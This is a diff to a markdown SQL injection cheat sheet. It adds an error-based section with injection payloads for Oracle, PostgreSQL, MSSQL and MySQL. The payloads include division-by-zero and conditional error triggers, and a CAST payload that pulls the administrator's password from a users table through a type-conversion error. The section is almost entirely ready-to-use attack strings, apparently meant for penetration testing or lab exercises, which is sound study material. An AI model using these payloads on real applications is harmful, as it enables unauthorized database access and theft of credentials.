@@ -110,6 +110,51 @@ Use `LENGTH()` or `SUBSSTRING()` logic to extract text via True/False response.
 
 ---
 
+## 💥 Error-Based SQLi
+
+**ORACLE**
+
+Trigger division error:
+
+```sql
+' AND 1=1/0--
+```
+
+Conditional error:
+
+```sql
+' AND (SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END FROM dual)--'
+```
+
+Type conversion error:
+
+```sql
+' AND 1=CAST((SELECT password from users WHERE username='administrator' AND ROWNUM=1) AS INT)--
+```
+
+Common Oracle errors:
+
+- ORA-01476 (divide by zero)
+- ORA-01722 (invalid number)
+
+**PostgreSQL**
+
+```sql
+1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+```
+
+**MSSQL**
+
+```sql
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+```
+
+**MySQL**
+
+```sql
+SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+```
+
 ## Union-Based SQLi
 
 Used when output is reflected:
